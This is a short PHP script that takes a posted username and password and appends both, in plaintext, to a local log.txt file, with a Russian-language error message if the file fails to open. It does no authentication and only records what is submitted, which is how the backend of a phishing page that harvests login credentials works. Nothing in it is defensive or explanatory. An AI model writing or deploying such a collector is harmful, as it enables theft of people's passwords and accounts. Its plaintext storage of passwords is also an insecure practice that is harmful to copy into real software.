<?php

$username = isset($_POST['username']) ? $_POST['username'] : 'Unknown';
$password = isset($_POST['password']) ? $_POST['password'] : 'Unknown';


$fp = fopen('log.txt', 'a+');
if ($fp) {
 
    fwrite($fp, "Username: " . htmlspecialchars($username) . "\n");
    fwrite($fp, "Password: " . htmlspecialchars($password) . "\n");
    fwrite($fp, "----------------\n");

  
    fclose($fp);
} else {
    echo "Ошибка при открытии файла.";
}
?>
